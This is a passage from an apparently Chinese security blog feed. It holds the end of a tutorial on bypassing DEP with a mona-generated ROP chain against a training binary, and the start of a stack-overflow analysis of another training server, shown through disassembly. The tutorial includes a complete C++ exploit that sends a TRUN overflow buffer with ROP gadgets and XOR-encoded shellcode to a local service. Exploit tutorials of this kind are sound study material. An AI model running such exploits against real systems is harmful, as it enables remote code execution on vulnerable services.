ss:[esp],eax               ; |</span><br><span class="line">00401821  |.  E8 A2150000   call &lt;jmp.&amp;msvcrt.strcpy&gt;                ; \strcpy</span><br><span class="line">00401826  |.  C9            leave</span><br><span class="line">00401827  \.  C3            retn</span><br></pre></td></tr></table></figure><p>经过分析可以得到其在栈空间中分配的临时的字符缓冲区大小为<code>0x7E8</code> ，即：<code>2024</code> 个字节大小</p><h2 id="构造利用">构造利用</h2><h3 id="mona找rop链">mona找rop链</h3><p>使用<code>mona</code>脚本，来构造ROP链</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">*** [ C ] ***</span><br><span class="line"></span><br><span class="line">             <span class="meta">#<span class="meta-keyword">define</span> CREATE_ROP_CHAIN(name, ...) \</span></span><br><span class="line"><span class="meta">               int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \</span></span><br><span class="line"><span class="meta">               unsigned int name[name##_length / sizeof(unsigned int)]; \</span></span><br><span class="line"><span class="meta">               create_rop_chain(name, ##__VA_ARGS__);</span></span><br><span class="line"></span><br><span class="line">             <span class="function"><span class="keyword">int</span> <span class="title">create_rop_chain</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *buf, <span class="keyword">unsigned</span> <span class="keyword">int</span> )</span></span></span><br><span class="line"><span class="function">             </span>&#123;</span><br><span class="line">               <span class="comment">// rop chain generated with mona.py - www.corelan.be</span></span><br><span class="line">               <span class="keyword">unsigned</span> <span class="keyword">int</span> rop_gadgets[] = &#123;</span><br><span class="line">                 <span class="number">0x77bf9d61</span>,  <span class="comment">// POP EBP // RETN [msvcrt.dll]</span></span><br><span class="line">                 <span class="number">0x7c862144</span>,  <span class="comment">// SetProcessDEPPolicy() [kernel32.dll]</span></span><br><span class="line">                 <span class="number">0x77eaf4de</span>,  <span class="comment">// POP EBX // RETN [RPCRT4.dll]</span></span><br><span class="line">                 <span class="number">0x62505000</span>,  <span class="comment">// &amp;0x00000000 [essfunc.dll]</span></span><br><span class="line">                 <span class="number">0x77c0dbbc</span>,  <span class="comment">// POP EDI // RETN [msvcrt.dll]</span></span><br><span class="line">                 <span class="number">0x77c0dbbc</span>,  <span class="comment">// skip 4 bytes [msvcrt.dll]</span></span><br><span class="line">                 <span class="number">0x7c96d22b</span>,  <span class="comment">// PUSHAD // RETN [ntdll.dll]</span></span><br><span class="line">               &#125;;</span><br><span class="line">               <span class="keyword">if</span>(buf != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                 <span class="built_in">memcpy</span>(buf, rop_gadgets, <span class="keyword">sizeof</span>(rop_gadgets));</span><br><span class="line">               &#125;;</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">sizeof</span>(rop_gadgets);</span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">             <span class="comment">// use the &#x27;rop_chain&#x27; variable after this call, it&#x27;s just an unsigned int[]</span></span><br><span class="line">             CREATE_ROP_CHAIN(rop_chain, );</span><br><span class="line">             <span class="comment">// alternatively just allocate a large enough buffer and get the rop chain, i.e.:</span></span><br><span class="line">             <span class="comment">// unsigned int rop_chain[256];</span></span><br><span class="line">             <span class="comment">// int rop_chain_length = create_rop_chain(rop_chain, );</span></span><br></pre></td></tr></table></figure><p>需要注意0截断的问题。</p><h3 id="exploit程序">exploit程序</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;Winsock2.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;cstring&gt;</span><br><span class="line"></span><br><span class="line">#pragma comment(lib, &quot;Ws2_32.lib&quot;)</span><br><span class="line"></span><br><span class="line">bool SocketStartup()</span><br><span class="line">&#123;</span><br><span class="line">WORD wVersionRequested;</span><br><span class="line">WSADATA wsaData;</span><br><span class="line">int err;</span><br><span class="line"></span><br><span class="line">wVersionRequested = MAKEWORD( 2, 2 );</span><br><span class="line"></span><br><span class="line">err = WSAStartup( wVersionRequested, &amp;wsaData );</span><br><span class="line">if ( err != 0 ) &#123;</span><br><span class="line">/* Tell the user that we could not find a usable */</span><br><span class="line">/* WinSock DLL.                                  */</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* Confirm that the WinSock DLL supports 2.2.*/</span><br><span class="line">/* Note that if the DLL supports versions greater    */</span><br><span class="line">/* than 2.2 in addition to 2.2, it will still return */</span><br><span class="line">/* 2.2 in wVersion since that is the version we      */</span><br><span class="line">/* requested.                                        */</span><br><span class="line"></span><br><span class="line">if ( LOBYTE( wsaData.wVersion ) != 2 ||</span><br><span class="line">        HIBYTE( wsaData.wVersion ) != 2 ) &#123;</span><br><span class="line">/* Tell the user that we could not find a usable */</span><br><span class="line">/* WinSock DLL.                                  */</span><br><span class="line">WSACleanup( );</span><br><span class="line">return false; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#define BUF_MAX_SIZE (0x7E8 + 28 + 17 + 176 + 4 + 6)</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">unsigned int rop_gadgets[] = &#123;</span><br><span class="line">0x77bf9d61,  // POP EBP // RETN [msvcrt.dll]</span><br><span class="line">0x7c862144,  // SetProcessDEPPolicy() [kernel32.dll]</span><br><span class="line">0x77eaf4de,  // POP EBX // RETN [RPCRT4.dll]</span><br><span class="line">0x62505001,  // &amp;0x00000000 [essfunc.dll]</span><br><span class="line">0x77c0dbbc,  // POP EDI // RETN [msvcrt.dll]</span><br><span class="line">0x77c0dbbc,  // skip 4 bytes [msvcrt.dll]</span><br><span class="line">0x7c96d22b,  // PUSHAD // RETN [ntdll.dll]</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">size_t nRopBytes = sizeof(rop_gadgets);</span><br><span class="line"></span><br><span class="line">char szBuf[BUF_MAX_SIZE] = &#123;0&#125;;</span><br><span class="line">memset(szBuf, 0x90, BUF_MAX_SIZE);</span><br><span class="line"></span><br><span class="line">unsigned char decode_data[17] = &#123;</span><br><span class="line">0x33, 0xC9, 0xB1, 0xC8, 0x8B, 0xFC, 0x83, 0xC7, 0x1D, 0x80, 0x37, 0x8C, 0x47, 0xFE, 0xC9, 0x75, </span><br><span class="line">0xF8</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">unsigned char encode_data[176] = &#123;</span><br><span class="line">0x70, 0xE4, 0xE6, 0x86, 0xB4, 0x92, 0xE4, 0xEF, 0x05, 0x5D, 0xC3, 0xE4, 0xBE, 0xF8, 0x1D, 0x80, </span><br><span class="line">0x07, 0x78, 0x01, 0xF2, 0x78, 0xBF, 0x57, 0x3B, 0x88, 0xA7, 0x6F, 0xEA, 0x37, 0xBF, 0xBE, 0xDF, </span><br><span class="line">0xE4, 0xF9, 0xFF, 0xE9, 0xFE, 0xD8, 0xBF, 0x5E, 0xE8, 0x07, 0x91, 0x94, 0x8C, 0x8C, 0x8C, 0x07, </span><br><span class="line">0xD7, 0xBC, 0x07, 0xD7, 0x80, 0x07, 0xD7, 0x80, 0x07, 0x97, 0x07, 0x97, 0x07, 0xE7, 0x94, 0x21, </span><br><span class="line">0xB1, 0xE6, 0x86, 0xB4, 0x92, 0xF9, 0x89, 0x19, 0x73, 0xDB, 0x74, 0x19, 0xEC, 0x07, 0xC9, 0xB0, </span><br><span class="line">0x07, 0xC0, 0x89, 0xF4, 0x8F, 0x41, 0x07, 0xD5, 0xAC, 0x8F, 0x51, 0xBF, 0x73, 0xCB, 0x07, 0xB8, </span><br><span class="line">0x37, 0x8F, 0x79, 0x15, 0x83, 0x32, 0x8A, 0xB6, 0x48, 0xF8, 0x84, 0x4D, 0x46, 0x8B, 0x8F, 0x5C, </span><br><span class="line">0xCA, 0x67, 0x7D, 0xB7, 0xD8, 0xA8, 0x90, 0xF9, 0x68, 0x07, 0xD5, 0xA8, 0x8F, 0x51, 0xEA, 0x07, </span><br><span class="line">0xB0, 0xF7, 0x07, 0xD5, 0x90, 0x8F, 0x51, 0x8F, 0xA0, 0x37, 0x19, 0xD3, 0x27, 0xDB, 0xED, 0xB1, </span><br><span class="line">0xE6, 0x86, 0xB4, 0x92, 0xF9, 0x25, 0xBF, 0x57, 0xDF, 0xE4, 0xE9, 0xE0, 0xE0, 0xE3, 0xE4, 0xFF, </span><br><span class="line">0xED, 0xF5, 0xE4, 0x07, 0x48, 0xDF, 0xDC, 0xDC, 0xDF, 0x73, 0xDB, 0x70, 0xDF, 0x73, 0xDB, 0x74</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">memcpy(szBuf, &quot;TRUN &quot;, strlen(&quot;TRUN &quot;) + 1);</span><br><span class="line">szBuf[5] = 0x2E;</span><br><span class="line">memcpy(&amp;szBuf[0x7E8 - 12], rop_gadgets, nRopBytes);</span><br><span class="line">memcpy(&amp;szBuf[0x7E8 - 12 + nRopBytes], decode_data, 17);</span><br><span class="line">memcpy(&amp;szBuf[0x7E8 - 12 + nRopBytes+ 17], encode_data, 176);</span><br><span class="line"></span><br><span class="line">if (SocketStartup() == false)</span><br><span class="line">&#123;</span><br><span class="line">return -1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SOCKET fdSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">if (fdSock == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; &quot;create socket descriptor failed&quot; &lt;&lt; std::endl;</span><br><span class="line">return -1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sockaddr_in stSockAddr = &#123;0&#125;;</span><br><span class="line"></span><br><span class="line">stSockAddr.sin_family = AF_INET;</span><br><span class="line">stSockAddr.sin_port = htons(9999);</span><br><span class="line">stSockAddr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;);</span><br><span class="line"></span><br><span class="line">if (connect(fdSock, (sockaddr*)&amp;stSockAddr, sizeof(stSockAddr)) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; &quot;connect failed&quot; &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">closesocket(fdSock);</span><br><span class="line">WSACleanup();</span><br><span class="line">return -1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char szBuf1[100] = &#123;0&#125;;</span><br><span class="line">recv(fdSock, szBuf1, 100, 0);</span><br><span class="line"></span><br><span class="line">if (send(fdSock, szBuf, BUF_MAX_SIZE, 0) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; &quot;send failed&quot; &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">shutdown(fdSock, SD_SEND);</span><br><span class="line">closesocket(fdSock);</span><br><span class="line">WSACleanup();</span><br><span class="line">return -1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; &quot;utilize success&quot; &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">shutdown(fdSock, SD_SEND);</span><br><span class="line">closesocket(fdSock);</span><br><span class="line">WSACleanup();</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="运行结果图">运行结果图</h3><p><img src="https://cdn.jsdelivr.net/gh/m-Onst/pics@main/blog/202104/20210407182221.png" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;利用rop突破dep分析expolit_me并做rop&quot;&gt;利用ROP突破DEP：分析expolit_me并做rop&lt;/h1&gt;
&lt;h2 id=&quot;分析目标程序&quot;&gt;分析目标程序&lt;/h2&gt;
&lt;p&gt;使用OD打开&lt;code&gt;exploit_me&lt;/code&gt;，找到关键的几</summary>
      
    
    
    
    <category term="shellcode在漏洞利用中的应用" scheme="https://4st.tech/categories/shellcode%E5%9C%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/"/>
    
    
    <category term="逆向" scheme="https://4st.tech/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="shellcode" scheme="https://4st.tech/tags/shellcode/"/>
    
    <category term="漏洞利用" scheme="https://4st.tech/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    <category term="rop" scheme="https://4st.tech/tags/rop/"/>
    
  </entry>
  
  <entry>
    <title>栈溢出：分析exploit_me_A</title>
    <link href="https://4st.tech/2021/04/06/zhan-yi-chu-fen-xi-exploit-me-a/"/>
    <id>https://4st.tech/2021/04/06/zhan-yi-chu-fen-xi-exploit-me-a/</id>
    <published>2021-04-06T07:33:47.000Z</published>
    <updated>2021-08-04T04:57:02.777Z</updated>
    
    <content type="html"><![CDATA[<h1 id="分析目标程序">分析目标程序</h1><h2 id="分析大体流程">分析大体流程</h2><p>使用IDA打开，分析下这个程序的具体功能：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">.text:004010B0 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:004010B0 _main           proc near               ; CODE XREF: start+AFp</span><br><span class="line">.text:004010B0</span><br><span class="line">.text:004010B0 addrlen         = dword ptr -3B8h</span><br><span class="line">.text:004010B0 name            = sockaddr ptr -3B4h</span><br><span class="line">.text:004010B0 addr            = sockaddr ptr -3A4h</span><br><span class="line">.text:004010B0 buf             = byte ptr -394h</span><br><span class="line">.text:004010B0 WSAData         = WSAData ptr -190h</span><br><span class="line">.text:004010B0 argc            = dword ptr  4</span><br><span class="line">.text:004010B0 argv            = dword ptr  8</span><br><span class="line">.text:004010B0 envp            = dword ptr  0Ch</span><br><span class="line">.text:004010B0</span><br><span class="line">.text:004010B0                 sub     esp, 3B4h</span><br><span class="line">.text:004010B6                 lea     eax, [esp+3B4h+WSAData]</span><br><span class="line">.text:004010BD                 push    ebp</span><br><span class="line">.text:004010BE                 push    eax             ; lpWSAData</span><br><span class="line">.text:004010BF                 push    101h            ; wVersionRequested</span><br><span class="line">.text:004010C4                 call    ds:WSAStartup</span><br><span class="line">.text:004010C4</span><br><span class="line">.text:004010CA                 push    0               ; protocol</span><br><span class="line">.text:004010CC                 push    1               ; type</span><br><span class="line">.text:004010CE                 push    2               ; af</span><br><span class="line">.text:004010D0                 call    ds:socket</span><br><span class="line">.text:004010D0</span><br><span class="line">.text:004010D6                 mov     ebp, eax</span><br><span class="line">.text:004010D8                 test    ebp, ebp</span><br><span class="line">.text:004010DA                 jge     short LBL_CREATE_SOCKET_SUCCESS</span><br><span class="line">.text:004010DA</span><br><span class="line">.text:004010DC                 push    offset s-&gt;SocketCreatingError ; &quot;socket creating error!&quot;</span><br><span class="line">.text:004010E1                 push    ebp</span><br><span class="line">.text:004010E2                 mov     ecx, offset g_cout</span><br><span class="line">.text:004010E7                 call    ostream::operator&lt;&lt;(int)</span><br><span class="line">.text:004010E7</span><br><span class="line">.text:004010EC                 mov     ecx, eax</span><br><span class="line">.text:004010EE                 call    ostream::operator&lt;&lt;(char const *)</span><br><span class="line">.text:004010EE</span><br><span class="line">.text:004010F3                 push    offset flush</span><br><span class="line">.text:004010F8                 push    0Ah</span><br><span class="line">.text:004010FA                 mov     ecx, eax</span><br><span class="line">.text:004010FC                 call    ostream::operator&lt;&lt;(uchar)</span><br><span class="line">.text:004010FC</span><br><span class="line">.text:00401101                 mov     ecx, eax</span><br><span class="line">.text:00401103                 call    sub_4012B0</span><br><span class="line">.text:00401103</span><br><span class="line">.text:00401108                 push    1               ; Code</span><br><span class="line">.text:0040110A                 call    _exit</span><br><span class="line">.text:0040110A</span><br></pre></td></tr></table></figure><p>其创建了一个<code>AF_INET, SOCK_STREAM, IPPROTO_IP</code> 类型的socket，如果创建失败则退出进程。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">.text:0040110F LBL_CREATE_SOCKET_SUCCESS:              ; CODE XREF: _main+2Aj</span><br><span class="line">.text:0040110F                 push    1E61h           ; hostshort</span><br><span class="line">.text:00401114                 mov     word ptr [esp+3BCh+name.sa_data+2], 2</span><br><span class="line">.text:0040111B                 call    ds:htons</span><br><span class="line">.text:0040111B</span><br><span class="line">.text:00401121                 push    0               ; hostlong</span><br><span class="line">.text:00401123                 mov     word ptr [esp+3BCh+name.sa_data+4], ax</span><br><span class="line">.text:00401128                 call    ds:htonl</span><br><span class="line">.text:00401128</span><br><span class="line">.text:0040112E                 lea     ecx, [esp+3B8h+name.sa_data+2]</span><br><span class="line">.text:00401132                 push    10h             ; namelen</span><br><span class="line">.text:00401134                 push    ecx             ; name</span><br><span class="line">.text:00401135                 push    ebp             ; s</span><br><span class="line">.text:00401136                 mov     dword ptr [esp+3C4h+name.sa_data+6], eax</span><br><span class="line">.text:0040113A                 call    ds:bind</span><br><span class="line">.text:0040113A</span><br><span class="line">.text:00401140                 test    eax, eax</span><br><span class="line">.text:00401142                 jz      short LBL_BINDING_STREAM_SOCKET_SUCCESS</span><br><span class="line">.text:00401142</span><br><span class="line">.text:00401144                 push    offset s-&gt;BindingStreamSocketError ; &quot;binding stream socket error!&quot;</span><br><span class="line">.text:00401149                 mov     ecx, offset g_cout</span><br><span class="line">.text:0040114E                 call    ostream::operator&lt;&lt;(char const *)</span><br><span class="line">.text:0040114E</span><br><span class="line">.text:00401153                 push    offset flush</span><br><span class="line">.text:00401158                 push    0Ah</span><br><span class="line">.text:0040115A                 mov     ecx, eax</span><br><span class="line">.text:0040115C                 call    ostream::operator&lt;&lt;(uchar)</span><br><span class="line">.text:0040115C</span><br><span class="line">.text:00401161                 mov     ecx, eax</span><br><span class="line">.text:00401163                 call    sub_4012B0</span><br><span class="line">.text:00401163</span><br><span class="line">.text:00401168</span><br><span class="line">.text:00401168 LBL_BINDING_STREAM_SOCKET_SUCCESS:      ; CODE XREF: _main+92j</span><br><span class="line">.text:00401168                 push    ebx</span><br><span class="line">.text:00401169                 push    offset asc_4090B8 ; &quot;**************************************&quot;</span><br><span class="line">.text:0040116E                 mov     ecx, offset g_cout</span><br><span class="line">.text:00401173                 call    ostream::operator&lt;&lt;(char const *)</span><br><span class="line">.text:00401173</span><br><span class="line">.text:00401178                 push    offset flush</span><br><span class="line">.text:0040117D                 push    0Ah</span><br><span class="line">.text:0040117F                 mov     ecx, eax</span><br><span class="line">.text:00401181                 call    ostream::operator&lt;&lt;(uchar)</span><br><span class="line">.text:00401181</span><br><span class="line">.text:00401186                 mov     ecx, eax</span><br><span class="line">.text:00401188                 call    sub_4012B0</span><br><span class="line">.text:00401188</span><br><span class="line">.text:0040118D                 push    offset s-&gt;ExploitTargetServer1_0 ; &quot;     exploit target server 1.0\t   &quot;</span><br><span class="line">.text:00401192                 mov     ecx, offset g_cout</span><br><span class="line">.text:00401197                 call    ostream::operator&lt;&lt;(char const *)</span><br><span class="line">.text:00401197</span><br><span class="line">.text:0040119C                 push    offset flush</span><br><span class="line">.text:004011A1                 push    0Ah</span><br><span class="line">.text:004011A3                 mov     ecx, eax</span><br><span class="line">.text:004011A5                 call    ostream::operator&lt;&lt;(uchar)</span><br><span class="line">.text:004011A5</span><br><span class="line">.text:004011AA                 mov     ecx, eax</span><br><span class="line">.text:004011AC                 call    sub_4012B0</span><br><span class="line">.text:004011AC</span><br><span class="line">.text:004011B1                 push    offset asc_4090B8 ; &quot;**************************************&quot;</span><br><span class="line">.text:004011B6                 mov     ecx, offset g_cout</span><br><span class="line">.text:004011BB                 call    ostream::operator&lt;&lt;(char const *)</span><br><span class="line">.text:004011BB</span><br><span class="line">.text:004011C0                 push    offset flush</span><br><span class="line">.text:004011C5                 push    0Ah</span><br><span class="line">.text:004011C7                 mov     ecx, eax</span><br><span class="line">.text:004011C9                 call    ostream::operator&lt;&lt;(uchar)</span><br><span class="line">.text:004011C9</span><br><span class="line">.text:004011CE                 mov     ecx, eax</span><br><span class="line">.text:004011D0                 call    sub_4012B0</span><br><span class="line">.text:004011D0</span><br><span class="line">.text:004011D5                 push    4               ; backlog</span><br><span class="line">.text:004011D7                 push    ebp             ; s</span><br><span class="line">.text:004011D8                 call    ds:listen</span><br><span class="line">.text:004011DE                 lea     edx, [esp+3BCh+name]</span><br><span class="line">.text:004011E2                 lea     eax, [esp+3BCh+addr.sa_data+2]</span><br><span class="line">.text:004011E6                 push    edx             ; addrlen</span><br><span class="line">.text:004011E7                 push    eax             ; addr</span><br><span class="line">.text:004011E8                 push    ebp             ; s</span><br><span class="line">.text:004011E9                 mov     dword ptr [esp+3C8h+name.sa_family], 10h</span><br><span class="line">.text:004011F1                 call    ds:accept</span><br><span class="line">.text:004011F1</span><br><span class="line">.text:004011F7                 mov     ebx, eax</span><br><span class="line">.text:004011F9                 cmp     ebx, 0FFFFFFFFh</span><br><span class="line">.text:004011FC                 jz      short LBL_ACCEPT_ERR</span><br><span class="line">; ... 省略一部分代码</span><br><span class="line">.text:0040127D LBL_ACCEPT_ERR:                         ; CODE XREF: _main+14Cj</span><br><span class="line">.text:0040127D                 push    offset s-&gt;AcceptError ; &quot;accept error!&quot;</span><br><span class="line">.text:00401282                 mov     ecx, offset g_cout</span><br><span class="line">.text:00401287                 call    ostream::operator&lt;&lt;(char const *)</span><br><span class="line">.text:00401287</span><br><span class="line">.text:0040128C                 push    offset flush</span><br><span class="line">.text:00401291                 push    0Ah</span><br><span class="line">.text:00401293                 mov     ecx, eax</span><br><span class="line">.text:00401295                 call    ostream::operator&lt;&lt;(uchar)</span><br><span class="line">.text:00401295</span><br><span class="line">.text:0040129A                 mov     ecx, eax</span><br><span class="line">.text:0040129C                 call    sub_4012B0</span><br><span class="line">.text:0040129C</span><br><span class="line">.text:004012A1                 call    ds:WSACleanup</span><br><span class="line">.text:004012A1</span><br><span class="line">.text:004012A7                 pop     ebx</span><br><span class="line">.text:004012A8                 pop     ebp</span><br><span class="line">.text:004012A9                 add     esp, 3B4h</span><br><span class="line">.text:004012AF                 retn</span><br><span class="line">.text:004012AF</span><br><span class="line">.text:004012AF _main           endp</span><br></pre></td></tr></table></figure><p>绑定，并设置好端口号，开始监听，并等待连接。当有连接进来时，如果握手失败，则开始清理socket环境并退出程序；否则，开始接受数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 